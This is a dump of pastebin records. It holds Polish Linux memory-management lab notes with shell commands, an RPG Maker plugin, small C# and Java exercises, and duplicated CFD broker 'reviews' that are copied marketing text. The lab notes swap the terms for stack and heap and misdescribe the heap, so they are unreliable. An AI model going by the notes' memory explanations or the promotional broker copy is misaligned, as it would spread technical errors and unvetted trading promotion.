 	time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240

	1:
    echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.10]-----------------------------------------------------------------------------\033[0m
[\033[0;32mstack\033[0m] - sterta(Segment z mapowaniem [ stack ])
[\033[0;32mheap\033[0m] - stos (Segment z mapowaniem [ heap ])
tak, \033[0;32moba sa anoniowe\033[0m, poniewaz ich zawartosc zostala wytworzona przez proces, a nie wczytana z pliku. 

\033[0;32mSterta\033[0m zawiera dane wytworzone przez proces np. zmienne lokalne, jest dynamicznie przyznawana procesowi.

Zawartosc segmentu procesu \033[0;32mmoze pochodzic z biblioteki\033[0m.

\033[0;32mPamiec anonimowa\033[0m lub mapowanie anonimowe reprezentuja pamiec, ktora nie jest obslugiwana przez system plikow.
Takie mapowania sa tworzone niejawnie dla stosu i sterty programu przez jawne wywolanie wywolania systemowego
mmap.""

pmap -X $(pidof stress -s)| grep --color -E ""stack|heap|$""
	

4.1.1.12. Jaki rozmiar zajmuja wszystkie strony procesu a jaki wszystkie przydzielone dla procesu ramki oraz kiedy strona jest ladowana do ramki?  - wymagane wskazanie odpowiednich wartosci w listingach
#ILOSC TERMINALI: 2
	2:
 	echo bfq > /sys/block/sda/queue/scheduler
 	time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240

	1:
    echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.12]-----------------------------------------------------------------------------\033[0m
\033[0;32mVSZ\033[0m - rozmiar stron [KiB]
rozmiar wszystkich przydzielonych dla procesu stron (w KiB) (cała pamięć, do której proces ma dostęp, czyli
pamięć wymieciona + pamięć zaalokowana + pamięć bibliotek współdzielonych + pamięć plików wykonywalnych)

\033[0;32mRSZ\033[0m - rozmiar ramek [KB]
rozmiar wszystkich przydzielonych dla procesu ramek z jego stronami (w KB) (nie uwzględnia SWAP, ale
uwzględnia pamięć bibliotek współdzielonych, czyli pokazuje tylko stan aktualny ramek w pamięci fizycznej)

\033[0;32mStrona jest ladowana do ramki\033[0m (czyli fizycznej strony pamieci) w momencie, gdy proces potrzebuje dostepu do danego obszaru pamieci wirtualnej,
ktory nie jest obecnie obecny w pamieci fizycznej.\n

\033[0;32mnie kazda\033[0m strona jest przechowywana w ramce tego procesu\n
gdy proces odwoluje sie do strony pamieci ktorej nie ma w zadnej z jego ramek \033[0;32mwystapi blad strony\033[0m
\033[0;32mkolejnosc odszukiwania strony\033[0m - poza zbiorem roboczym, (gdy wystapi \033[0;32mblad strony\033[0m):
\033[0;32m1.\033[0m swap cache - jesli znajdzie to blad poboczny, aktualizacja zbioru roboczego, pozniej tablicy
stron
\033[0;32m2.\033[0m przestrzeni wymiany swap
\033[0;32m3.\033[0m plik regularny tego programu lub biblioteki

\033[0;32mStrona jest ladowana do ramki\033[0m w momencie, gdy program probuje uzyskac dostep do tej strony.

To co proces ma w segmentach to jego pamięć wirtualna, każdy segment jest podzielony na strony. Te ze stron, które są
załadowane do ramek to jego rzeczywista fizyczna pamięć ulotna. Strony, które nie są w ramkach, znajdują się w
plikach regularnych programu lub bibliotekach, wykorzystywanych przez proces. Strona. która jest niepotrzebna dla
procesu zmienia oznaczenie na nieaktywną i jej właścicielem zostaje swap cache.""

    ps -o pid,vsz,rsz $(pidof stress -s) | grep --color -E ""VSZ|RSZ|$""



4.1.1.20. Jezeli plik zawierajacy program/biblioteke ELF zostanie usuniety, to skad system operacyjny bedzie doczytywal potrzebne strony, jaki jest zwiazek pomiedzy niezwolnionymi blokami systemu plikow a stronami? - omowienie statystyk wezlow i blokow systemu plikow, aby stwierdzic czy po usunieciu pliku zostaly one zwolnione wraz z usunietym wpisem katalogowym. 
#ILOSC TERMINALI: 2
	2:
	cp /usr/bin/stress /home/tytus/stress
	/home/tytus/stress -c 1

	1:
    echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.20]-----------------------------------------------------------------------------\033[0m
    Jezeli plik zawierajacy program/biblioteke ELF zostanie usuniety, to system operacyjny \033[0;32mbedzie doczytywal potrzebne strony Ze swap cache\033[0m
    jezeli nie ma potrzebnej strony w swapcache i strona nie jest wczytana do ramki to z swap.
    
    Zostanie usuniety jedynie wpis katalogowy - \033[0;32mnie zostana zwolnione\033[0m zadne bloki ani wezel zwiazany z tym plikiem
    Bloki nie zostaly zwolnione poniewaz proces korzysta ze wczytanych wczesniej stron programu/biblioteki.

    \033[0;32mBloki te blokuje\033[0m mechanizm pamieci wirtualnej, zeby moc doczytac

    Bloki i wezel \033[0;32mzostana zwolnione\033[0m, gdy wszystkie procesy korzystajace z tego pliku zostana zakonczone
    Wynika z tego, ze nie każde usunięcie plików w systemie plików spowoduje zwolnienie miejsca,

    Niezwolnione bloki systemu plikow to dane przechowywane na dysku, podczas gdy strony w
    pamieci operacyjnej sa ich buforowanymi wersjami w pamieci RAM, co umozliwia szybszy
    dostep do tych danych podczas operacji odczytu i zapisu
    ""
	#TO MUSI BYC ZROBIONE W TRAKCIE TRWANIA PROCESU STRESS (UPEWNIC SIE, ZE DZIALA ^^^)
	stat -f /home/tytus | grep --color -E ""wolnych:|$"" 
	ls /home/tytus
	rm /home/tytus/stress -f
	stat -f /home/tytus | grep --color -E ""wolnych:|$"" 
	ls /home/tytus
	killall stress
    #TUTAJ BEDZIE WIECEJ WOLNYCH:
	stat -f /home/tytus | grep --color -E ""wolnych:|$"" 
4.1.1.21. Z jakiego obszaru pamieci ulotnej wybierane sa niepuste ramki i jakie kryteria musi spelniac ramka wybrana przez algorytm wymiany? - analiza wynikow free –w dotyczaca roznicy w wartosciach pomiedzy kolumna free i available w wierszu mem. 
#ILOSC TERMINALI: 1
	1:
	echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.21]-----------------------------------------------------------------------------\033[0m
	\033[0;32mBierze z swap cache\033[0m

	\033[0;32mAlgorytm wymiany\033[0m (algorytm zastępowania stron)  bedzie wybieral przede wszystkim ramki ze stronami niekatywnymi,
    a w szczegolnosci zawierajace strony niezabrudzone i nieanonimowe (czyli ramki które mogą być natychmiastowo wykorzystane).

	\033[0;32mMEM free\033[0m - rozmiar wolnej pamięci fizycznej ulotnej (rozmiar wolnych ramek), ale bez ramek z przestrzeni swap-cache
	\033[0;32mMEM available\033[0m - wartość free + ramki ze swap cache zawierające niezabrudzone i nieanonimowe strony (możliwe,
    że jeszcze + ramki z buforów zawierające niezabrudzone strony)

    \033[0;32mStrony nieaktywne\033[0m - nie byly ostatnio uzywane (nie bylo do nich w ostatnim czasie odwołań)

    \033[0;32mStrony niezabrudzone\033[0m - ich zawartosc nie zmienila sie od momentu wczytania ich do ramki

    \033[0;32mstrony nieanonimowe\033[0m - strony ktorych zawartosc zostala wczytana z pliku regularnego z programem lub biblioteka

    fakt ze ramka z ta strona nalezy do swap cache oznacza, ze \033[0;32mstrona jest nieaktywna\033[0m
    
    Ramki zawierajace strony niezabrudzone i nieanonimowe moga byc natychmiastowo wykorzystane
    
    Jeśli ramka w swap cache zawiera stronę \033[0;32mzabrudzoną\033[0m lub \033[0;32manonimową\033[0m, to nie możemy załadować do niej strony,
    ponieważ nadpisalibyśmy dane. Dlatego takie strony są utwrwalane w przestrzeni wymiany. Będą to np. strony
    zawierające ramkę tekstu, ponieważ ramka tekstu zawiera kod programu, więc nie może zostać zmieniona. 
    
    Za wczytywanie stron do ramek odpowiada system operacyjny
    
    Jeżeli wartość available jest niska to zachodzi procedura OOM (Out Of Memory)""

	free -wh | grep --color -E ""free|available|$"" 

4.1.1.24. Jakie zasoby systemowe trzeba monitorowac i jakie dzialania mozna podjac aby procedura OOM nie byla zastosowana? - wymagane zaprezentowanie odpowiednich wartosci w listingach.
#ILOSC TERMINALI: 1
	1:
    echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.24]-----------------------------------------------------------------------------\033[0m
    Należy regularnie kontrolować stan dostępnej pamięci operacyjnej (mem \033[0;32mused\033[0m i \033[0;32mavailable\033[0m) oraz ile mamy wykorzystanej
    pamięci swap (ilosc wolnych ramek w pamieci, zajetosc przestrzeni wymiany swap)

    Jeśli posiadamy mało wolnej ulotnej pamięci fizycznej (available) oraz mało wolnej pamięci przestrzeni wymiany (free),
    możemy spodziewać się podjęcia przez system operacyjny odpowiednich kroków
    
    \033[0;32mW przypadku presji pamieci\033[0m (kiedy brakuje ramek) system stosuje:
    \033[0;32m1.\033[0m wymiatanie stron.
    \033[0;32m2.\033[0m redukcja zbioru roboczego procesu - odebranie czesci przydzielonych procesom ramek
    \033[0;32m3.\033[0m procedura OOM (Out of Memory) - wybierane sa procesy, ktore zostana natychmiast zakonczone
    
    Aby procedura OOM nie była zastosowana możemy:
    \033[0;32m- powiekszyc przestrzen wymiany\033[0m poprzez dodanie pliku wymiany (ale tylko w Linuxie, w Windowsie nie można, bo trzeba by było restartować system
    \033[0;32m- zakonczyc procesy\033[0m, które są nam już niepotrzebne, dzięki czemu będziemy mieli kontrolę nad procesami, które zostaną zamknięte
    \033[0;32m- zapisać stan procesów\033[0m na dysku.
    
    Dlatego też instalowanie systemu bez przestrzeni wymiany swap jest złym pomysłem, ponieważ bez magazynów stron
    przyspierzymy wystąpienie procedury OOM.
""

	free -wh | grep --color -E ""free|used|$"" 

/////////////////////////////////////////////////////////////KONIEC LISTINGOW/////////////////////////////////////////////////////////////////////////////////////////////////////
Z tego co widze to dodatkowe:

Blad poboczny wystepeuje gdy strona przechowyana jest w ramce(np. w swap cache) jednak nie wystepuje w zbiorze roboczym, wtedy wymagana jest aktualizacja tablicy stron

Blad glowny wymaga zaladowania strony do ramki(np z programu, biblioteki lub sprowadzenia z przestrzeni wymiany swap).

Wyswietlanie informacji o biezacych priorytetach I/O dla procesow:
ionice -p <pid>

Zmiana algorytmu windy dla dysku:
echo bfq > /sys/block/sda/queue/scheduler

ionice -c 1 -n 0
-c 1 (Realtime) to klasa o najwyzszym priorytecie I/O w systemie 
Priorytet 0 to najwyzszy priorytet dla ionice -c 1, zakres (0-7)

Algorytmy windy:
Algorytm BFQ dazy do uczciwego podzialu zasobow dyskowych miedzy procesy. Przydziela czas dostepu do dysku kazdemu procesowi w proporcji do jego budzetu. Priorytet I/O: Procesy o wyzszym priorytecie I/O maja wieksze szanse na otrzymanie wiekszego budzetu
///////////////////////////////////////////////////////////////////////////////////////////////////////////////"
1FDLiKBP,GWCombo v1,kura2yamato,JavaScript,Monday 13th of May 2024 08:08:17 AM CDT,"//---------------------------------------------------------
// GWComboSwitch.js 
// Copyright (c) 2024 GBison. All rights reserved.
// Released under the MIT license.
// http://opensource.org/licenses/mit-license.php
//=========================================================

/*:
 * @plugindesc Combo System By Checking the Switch. 
 * @author Gbison 
 * @version 1
 *
 * @help
 * Copyright (c) 2024 GBison. All rights reserved.
 * Released under the MIT license.
 * ===================================================================
 * The Idea from JoeBumpster
 *
 * @param Plugin Version 
 * @desc Version for the Plugins
 *
 * @param Version
 * @type number
 * @default 0 
 * @parent Plugin Version
 *
 * @param Sub Version
 * @type number
 * @range 0,99
 * @desc Variable to Use
 * @default 0 
 * @parent Plugin Version
 *
 * @param Condition 
 * @desc Condition For Action
 *
 * @param Condition Name
 * @desc All Condition Name
 * @type string[]
 * @default [""Combo"",""Slice"",""Strike"",""Stab""]
 * @parent Condition
 *
 * @param Condition Switch
 * @desc All Condition Switch to Check
 * @type switch[]
 * @default [""10"",""11"",""12"",""13""]
 * @parent Condition
 *
 * @param Condition Variable
 * @desc All Condition Variable to update
 * @type variable[]
 * @default [""10"",""11"",""12"",""13""]
 * @parent Condition
 * 
 */
 (function() {
    // parameters
    var _thisPluinName = 'GWComboSwitch'; //change with your filename.
    var parameters = PluginManager.parameters(_thisPluinName);

    var listCondName = JSON.parse(parameters['Condition Name'] || ""[]"");
    var listCondSwitch = JSON.parse(parameters['Condition Switch'] || ""[]"");
    var listCondVariable = JSON.parse(parameters['Condition Variable'] || ""[]"");

    var _Game_Interpreter_pluginCommand = Game_Interpreter.prototype.pluginCommand;
    Game_Interpreter.prototype.pluginCommand = function(command, args) {
        _Game_Interpreter_pluginCommand.call(this, command, args);
        runPlugins = false;
        if (command === 'GWComboStat') {
            switch (args[0]) {
                case 'ComboIncrease':
                    $gameSystem.ComboIncrease();
                    runPlugins = [command, args];
                    break;
            }

        }

    };

    Game_System.prototype.ComboIncrease = function() {
        let nPos = 0;
        for (nPos = 0; nPos < listCondName.length; nPos++) {
            let condName = listCondName[nPos] || -1;
            let switchID = listCondSwitch[nPos] || -1;
            let varID = listCondVariable[nPos] || -1;
            if (condName != -1) {
                let oldValue = $gameVariables.value(varID);
                let switchStat = $gameSwitches.value(switchID);
                if (switchStat) {
                    $gameVariables.setValue(varID, ++oldValue);
                    $gameSwitches.setValue(switchID, 0); 
                } 
            } else {
                /*console.log('not active ' + condName, switchID, varID);*/
            }
        }


    };

})();

/*
The Idea from JoeBumpster
 https://forums.rpgmakerweb.com/index.php?threads/no-idea-why-this-switch-wont-flip.168634/

Must Read 
https://forums.rpgmakerweb.com/index.php?threads/parameter-structs.105978/
*/"
cbwR5myy,Review Skilling,reviewbrokers,PHP,Monday 13th of May 2024 07:44:06 AM CDT,"https://www.reviewbrokers.net/review-skilling/
 
The Skilling Group is made up of a multinational team of over 70 people from all over the world. Developers, marketers and specialists all work together from our offices located in Cyprus (CIF), Malta and Spain.



We’re a fintech trading company founded in 2016 by Scandinavian entrepreneurs, with a track record of success. With a rapidly growing international presence, and offices in Cyprus, Malta and Spain, we provide access to over 1,000 of the world’s top financial markets.



Skilling enables you to trade CFD instruments across the most renowned asset classes across multiple award-winning platforms, including its own advanced proprietary platform.



Its competitive pricing, reliability and quick execution, as well as our client-centric focus, are the reasons why more and more traders are switching to Skilling.



As we continue to expand and surpass our goals, Skilling’s vision remains simple: to make investment and trading engaging and accessible to everyone, in a transparent and secure way.



Broker Logo &nbsp;







Broker Type-CompanySkilling (Seychelles) LtdFoundation2016CountrySeychellesRegulationSkilling (Seychelles) Ltd is authorized and regulated under the Financial Services Authority&nbsp;Seychelles&nbsp;(FSA)under license No. SD042.The JurisdictionsContracts for difference (""CFD"") products and services offered by Skilling are not intended for use byresidents of Belgium, United Kingdom or any other person or resident of any country or jurisdiction wheresuch distribution or use would be contrary to local law or regulation.Live ChatLive chat support is available from Monday to Friday, between 04:00 and 22:00 CET.Emailsupport@skilling.com* Our customer support experts will get back to you within 24 hours.Call+2484632031* Our telephone support is available from Monday to Friday, between 07:00 and 22:00 CET.







Free Demo AccountsYesMinimum Initial Deposit25 €Multi-Currency Account EURSpreadsFrom 0.1 pipsStop Out Level50%Introducing Brokers ProgramYesSwap FreeNoPromotionsYesMAM/PAMMYesTrading Platforms&nbsp;MetaTrader 4, cTrader, Skilling Trader, Skilling CopyScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsVisa, Master Card, Bank Transfer, WebMoney, Skrill, Neteller, Klarna, Mifinity, AstroPay, BinancePay, Bank Transfer
"
rFnHZYn2,Review Skilling,fxvnpro,PHP,Monday 13th of May 2024 07:43:50 AM CDT,"https://www.fxvnpro.com/review-skilling/
 
The Skilling Group is made up of a multinational team of over 70 people from all over the world. Developers, marketers and specialists all work together from our offices located in Cyprus (CIF), Malta and Spain.



We’re a fintech trading company founded in 2016 by Scandinavian entrepreneurs, with a track record of success. With a rapidly growing international presence, and offices in Cyprus, Malta and Spain, we provide access to over 1,000 of the world’s top financial markets.



Skilling enables you to trade CFD instruments across the most renowned asset classes across multiple award-winning platforms, including its own advanced proprietary platform.



Its competitive pricing, reliability and quick execution, as well as our client-centric focus, are the reasons why more and more traders are switching to Skilling.



As we continue to expand and surpass our goals, Skilling’s vision remains simple: to make investment and trading engaging and accessible to everyone, in a transparent and secure way.



Broker Logo &nbsp;



BROKER INFORMATION



Broker Type-CompanySkilling (Seychelles) LtdFoundation2016CountrySeychellesRegulationSkilling (Seychelles) Ltd is authorized and regulated under the Financial Services Authority&nbsp;Seychelles&nbsp;(FSA)under license No. SD042.Minimum Initial Deposit25 €Account Base CurrenciesEURAccount Deposit MethodsVisa, Master Card, Bank Transfer, WebMoney, Skrill, Neteller, Klarna, Mifinity, AstroPay, BinancePay, Bank TransferAccount Withdrawal MethodsVisa, Master Card, Bank Transfer, WebMoney, Skrill, Neteller, Klarna, Mifinity, AstroPay, BinancePay, Bank TransferLive ChatLive chat support is available from Monday to Friday, between 04:00 and 22:00 CET.Emailsupport@skilling.com* Our customer support experts will get back to you within 24 hours.Call+2484632031* Our telephone support is available from Monday to Friday, between 07:00 and 22:00 CET.



ADVANTAGES



Free Demo AccountYesSpreadsFrom 0.1 pipsStop Out Level50%Execution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeNoPromotionsYesMAM/PAMMYesTrading Platforms&nbsp;MetaTrader 4, cTrader, Skilling Trader, Skilling CopyScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Shares, Soft Commodities, Indices, Cryptos



DISADVANTAGES



RestrictionsContracts for difference (""CFD"") products and services offered by Skilling are not intended for use byresidents of Belgium, United Kingdom or any other person or resident of any country or jurisdiction wheresuch distribution or use would be contrary to local law or regulation.
"
c9uvfdrt,Контроль выхода,NikaBang,C#,Monday 13th of May 2024 07:13:04 AM CDT,"using System;

internal class Program
{
    static void Main(string[] args)
    {
        string exitKey = ""exit"";
        string userInput;
        bool inProgram = true;

        while (inProgram)
        {
            Console.WriteLine(""Программа еще работает.\nДля завершения введите: exit."");
            userInput = Console.ReadLine();

            if (userInput == exitKey) 
            {
                inProgram = false;
            }
        }

        Console.WriteLine(""Программа завершена."");
        Console.ReadKey();
    }
}"
hXEYWhQE,Review Doto,fxvnpro,PHP,Monday 13th of May 2024 07:11:58 AM CDT,"https://www.fxvnpro.com/review-doto/
 
Doto. The trading simplifier. We make trading as easy as it gets, whether it’s your first trade or your thousandth.



Trade simply with an intuitive interface and a step-by-step guide inside, trading for success just got easier.



Doto analyzed the collective experience of millions of traders to bring you a powerful, user-friendly platform. 



Licensed by top financial regulators, we’re about bringing simplicity and security to your trading.



We’re not just on the screen, we’re right with you. Anytime you need help, just reach out to us.



Broker Logo  



BROKER INFORMATION



Broker Type-CompanyDoto GroupFoundation2019CountryCyprusRepublic of MauritiusSouth AfricaSeychellesRegulation- Doto Europe Ltd., licensed and regulated as an investment firm by the Cyprus Securities and Exchange Commission(CySEC) of Cyprus under license number 399/21.- Doto Global Ltd., licensed and regulated as an investment dealer by the Financial Services Commission (FSC) ofMauritius under license number C119023978.- Doto South Africa Pty. Ltd., licensed and regulated as an authorized financial service provider by the Financial Sector ConductAuthority (FSCA) of South Africa under license number 50451.- Doto International Ltd., licensed and regulated as a securities dealer by the Financial Services Authority (FSA) ofSeychelles under license number SD0063. Minimum Initial Deposit$15Account Base CurrenciesUSDAccount Deposit MethodsVisa, Master Card, Maestro, Momo, QR Payments, Bank Transfer, and moreAccount Withdrawal MethodsVisa, Master Card, Maestro, Momo, QR Payments, Bank Transfer, and moreLive ChatYesEmailsupport-mu@doto.comCall+2304687113



ADVANTAGES



Free Demo AccountYesSpreadsFixed/FloatingStop Out Level50%Execution TypeMarket ExecutionAffiliate ProgramYesVirtual Private Server-Trading Platforms&nbsp;MetaTrader 4, MetaTrader 5, Doto PlatformScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Stocks, Commodities, Indices, Cryptos



DISADVANTAGES



RestrictionsThe services of Doto Global Ltd. and the information on this site are not directed at residents of American Samoa,Australia, Belgium, Brazil, Canada, the Central African Republic, the Democratic Republic of the Congo,the Republic of the Congo, Côte d’Ivoire, Eritrea, Guam, Heard Island and McDonald Islands, Hong Kong, Iran,Iraq, Israel, Japan, Lebanon, Liberia, Libya, Mali, Mauritius, Myanmar, New Zealand, North Korea,Northern Mariana Islands, Puerto Rico, Russia, Somalia, Sudan, the Syrian Arab Republic,the United Kingdom of Great Britain and Northern Ireland, the United States Minor Outlying Islands,the United States of America, the Virgin Islands of the United States or Yemen.
"
SXCvNqSU,Review Doto,reviewbrokers,PHP,Monday 13th of May 2024 07:11:46 AM CDT,"https://www.reviewbrokers.net/review-doto/
 
Doto. The trading simplifier. We make trading as easy as it gets, whether it’s your first trade or your thousandth.



Trade simply with an intuitive interface and a step-by-step guide inside, trading for success just got easier.



Doto analyzed the collective experience of millions of traders to bring you a powerful, user-friendly platform. 



Licensed by top financial regulators, we’re about bringing simplicity and security to your trading.



We’re not just on the screen, we’re right with you. Anytime you need help, just reach out to us.



Broker Logo  







Broker Type-CompanyDoto GroupFoundation2019CountryCyprusRepublic of MauritiusSouth AfricaSeychellesRegulation- Doto Europe Ltd., licensed and regulated as an investment firm by the Cyprus Securities and Exchange Commission(CySEC) of Cyprus under license number 399/21.- Doto Global Ltd., licensed and regulated as an investment dealer by the Financial Services Commission (FSC) ofMauritius under license number C119023978.- Doto South Africa Pty. Ltd., licensed and regulated as an authorized financial service provider by the Financial Sector ConductAuthority (FSCA) of South Africa under license number 50451.- Doto International Ltd., licensed and regulated as a securities dealer by the Financial Services Authority (FSA) ofSeychelles under license number SD0063. The JurisdictionsThe services of Doto Global Ltd. and the information on this site are not directed at residents of American Samoa,Australia, Belgium, Brazil, Canada, the Central African Republic, the Democratic Republic of the Congo,the Republic of the Congo, Côte d’Ivoire, Eritrea, Guam, Heard Island and McDonald Islands, Hong Kong, Iran,Iraq, Israel, Japan, Lebanon, Liberia, Libya, Mali, Mauritius, Myanmar, New Zealand, North Korea,Northern Mariana Islands, Puerto Rico, Russia, Somalia, Sudan, the Syrian Arab Republic,the United Kingdom of Great Britain and Northern Ireland, the United States Minor Outlying Islands,the United States of America, the Virgin Islands of the United States or Yemen.Live ChatYesEmailsupport-mu@doto.comCall+2304687113







Free Demo AccountsYesMinimum Initial Deposit$15Multi-Currency AccountUSDSpreadsFixed/FloatingStop Out Level50%Affiliates ProgramYesVirtual Private Server-Trading Platforms&nbsp;MetaTrader 4, MetaTrader 5, Doto PlatformScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsVisa, Master Card, Maestro, Momo, QR Payments, Bank Transfer, and more
"
USi25p1X,ДЗ Наибольший элемент,TeT91,C#,Monday 13th of May 2024 07:07:20 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int minValue = -20;
            int maxValue = -1;

            int[,] numbers = new int[10, 10];
            int largestNumber;
            int overwriteValue = 0;

            Console.WriteLine(""Первоначальная матрица:"");

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    numbers[i, j] = random.Next(minValue, maxValue + 1);

                    Console.Write(numbers[i, j] + "" "");
                }

                Console.WriteLine();
            }

            largestNumber = numbers[0, 0];

            foreach (int number in numbers)
            {
                if (number > largestNumber)
                {
                    largestNumber = number;
                }
            }

            Console.WriteLine(""Измененная матрица:"");

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    if (numbers[i, j] == largestNumber)
                    {
                        numbers[i, j] = overwriteValue;
                    }

                    Console.Write(numbers[i, j] + "" "");
                }

                Console.WriteLine();
            }

            Console.WriteLine(""Наибольшее число : "" + largestNumber);
            Console.ReadLine();
        }
    }
}"
yFe7Takk,Untitled,niske,Java,Monday 13th of May 2024 06:59:49 AM CDT,"import java.util.ArrayList;
import java.util.LinkedList;


public class DateKlase {
	
	public static void main (String[] args) {
		
		//LinkedList<String> imena = new LinkedList<String>();
		ArrayList<String> imena = new ArrayList<String>();
		
		imena.add(""Bakurski"");
		imena.add(""Niske"");
		imena.add(""Bogi"");
		imena.add(""Pera"");
		imena.add(""Slavica"");
		
		System.out.println(imena);
		System.out.println();
		
		for (String i : imena)
		{
			System.out.println(i);
		}
		
		System.out.println();
		// dodaj na mesto 2
		
		imena.add(1, ""Vlada"");
		
		System.out.println(imena);
		
		// menja ime na poziciji br 4
		
		System.out.println(""Ime pre promene: "" + imena.get(4));
		imena.set(4, ""Luka"");
		
		System.out.println(imena);
		
		System.out.println(""\nELementi na parnjim pozicijama: "");
		
		int brojac = 0;
		for (String i : imena)
		{
			
			if (brojac % 2 == 0)
			{
				System.out.println(i);
			}
			brojac ++;
		}
		
		System.out.println(""\nImena koja pocinju na s: "");
		
		for (String i : imena)
		{
			
			if (i.charAt(0) == 'S')
			{
				System.out.println(i);
			}
			
		}
		
		// izbaciti element sa pozicije 3
		
		imena.remove(3);
		System.out.println(""\n"" + imena);
		
		String uneto = ""Luka"";
		
		imena.remove(uneto);
		
		System.out.println(""\n"" + imena);
		
		// ZADATAK 2
		
		LinkedList<String> imenaIzFajla = ucitaj(""imena.txt"");
		System.out.println(imenaIzFajla);
		imenaIzFajla.addAll(imena);
		upisiUFajl(""novi.txt"", imenaIzFajla);
		
		
	}
	
	static LinkedList<String> ucitaj(String imeFajla) {
		
			LinkedList<String> imena = new LinkedList<String>();
			if (Svetovid.testIn(imeFajla))
			{
				while (Svetovid.in(imeFajla).hasMore())
				{
					String str = Svetovid.in(imeFajla).readLine();
					imena.add(str);
				}
				Svetovid.in(imeFajla).close();
			}
			return imena;
			
		}
		
		static void upisiUFajl(String imeFajla, LinkedList<String> s) {
		
			for (String ime : s)
			{
				Svetovid.out(imeFajla).println(ime);
			}
			Svetovid.out(imeFajla).close();
		}
	
}
		



"
DMuF6gau,Review Otet Markets,fxvnpro,PHP,Monday 13th of May 2024 06:20:31 AM CDT,"https://www.fxvnpro.com/review-otet-markets/
 
Welcome to Otet Markets, your ultimate destination for financial market trading solutions.



Our team consists of experienced professionals who are dedicated to providing our clients with the best possible trading experience. We specialize in Forex, Commodities, and Indices trading, offering a wide range of products and services designed to meet the diverse needs of our clients.



At Otet Markets, we believe that trust is the cornerstone of any successful business relationship. That is&nbsp;why we prioritize transparency and integrity in all our dealings. Our goal is to facilitate financial transactions and foster a profound sense of customer fulfillment. We build long-term relationships with our clients, based on mutual respect, professionalism, and an unwavering commitment to excellence.



We understand that each client is unique, which is why we offer tailored solutions to meet their individual needs. Whether you're a novice trader or an experienced investor, we have the tools and resources to help you achieve your financial goals. Our state-of-the-art trading platform is user-friendly and intuitive, making it easy for you to trade across multiple markets and instruments.



At Otet Markets, we pride ourselves on our customer-centric approach. Our knowledgeable customer support team is available 24/7 to assist you with any questions or concerns you may have. We and value any feedback and are always striving to improve our services to better serve your needs.



Thank you for choosing Otet Markets as your trusted partner in financial market trading.



We look forward to helping you achieve your investment objectives.



Broker Logo &nbsp;



BROKER INFORMATION



Broker TypeECNCompanyOtet Group LTDFoundation2023CountryThe Republic of Marshall IslandsRegulationOtet Group LTD&nbsp;is a financial brokerage company regulated by Comoros Union (MISA), licenseNo. T2023304 registration No. HY00523012 and also registered in the Republic of Marshall Islands,registration number 118922, Otet Markets has an Identification of legal financial activities (LEI)No. 254900HJ0CZRZVRN8C30 from Bloomberg.Minimum Initial Deposit$25Account Base CurrenciesUSDAccount Deposit MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoneyAccount Withdrawal MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoneyLive ChatYesEmail{mail}@otetmerkets.com{support}@otetmarkets.comCall+35725731042TelegramYes



ADVANTAGES



Free Demo AccountYesSpreadsMin/FloatingStop Out Level45% - Islamic Account50% - Classic/ECN/Premium AccountExecution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeYes (Islamic)PromotionsYesCopy TradingYesTrading Platforms&nbsp;Mobile App, MetaTrader 5, cTraderScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Energy, US Stocks, EU Stocks, Metals, Indices, Cryptos



DISADVANTAGES



RestrictionsThis website is not directed at any jurisdiction and is not intended for any use that would be contrary tolocal law or regulation. The service is not available for residents of Türkiye, Canada and the United States.
"
0yhGrpqk,Review Otet Markets,reviewbrokers,PHP,Monday 13th of May 2024 06:20:24 AM CDT,"https://www.reviewbrokers.net/review-otet-markets/
 
Welcome to Otet Markets, your ultimate destination for financial market trading solutions.



Our team consists of experienced professionals who are dedicated to providing our clients with the best possible trading experience. We specialize in Forex, Commodities, and Indices trading, offering a wide range of products and services designed to meet the diverse needs of our clients.



At Otet Markets, we believe that trust is the cornerstone of any successful business relationship. That is&nbsp;why we prioritize transparency and integrity in all our dealings. Our goal is to facilitate financial transactions and foster a profound sense of customer fulfillment. We build long-term relationships with our clients, based on mutual respect, professionalism, and an unwavering commitment to excellence.



We understand that each client is unique, which is why we offer tailored solutions to meet their individual needs. Whether you're a novice trader or an experienced investor, we have the tools and resources to help you achieve your financial goals. Our state-of-the-art trading platform is user-friendly and intuitive, making it easy for you to trade across multiple markets and instruments.



At Otet Markets, we pride ourselves on our customer-centric approach. Our knowledgeable customer support team is available 24/7 to assist you with any questions or concerns you may have. We and value any feedback and are always striving to improve our services to better serve your needs.



Thank you for choosing Otet Markets as your trusted partner in financial market trading.



We look forward to helping you achieve your investment objectives.



Broker Logo &nbsp;







Broker TypeECNCompanyOtet Group LTDFoundation2023CountryThe Republic of Marshall IslandsRegulationOtet Group LTD&nbsp;is a financial brokerage company regulated by Comoros Union (MISA), licenseNo. T2023304 registration No. HY00523012 and also registered in the Republic of Marshall Islands,registration number 118922, Otet Markets has an Identification of legal financial activities (LEI)No. 254900HJ0CZRZVRN8C30 from Bloomberg.&nbsp;The JurisdictionsThis website is not directed at any jurisdiction and is not intended for any use that would be contrary tolocal law or regulation. The service is not available for residents of Türkiye, Canada and the United States.Live ChatYesEmail{mail}@otetmerkets.com{support}@otetmarkets.comCall+35725731042TelegramYes







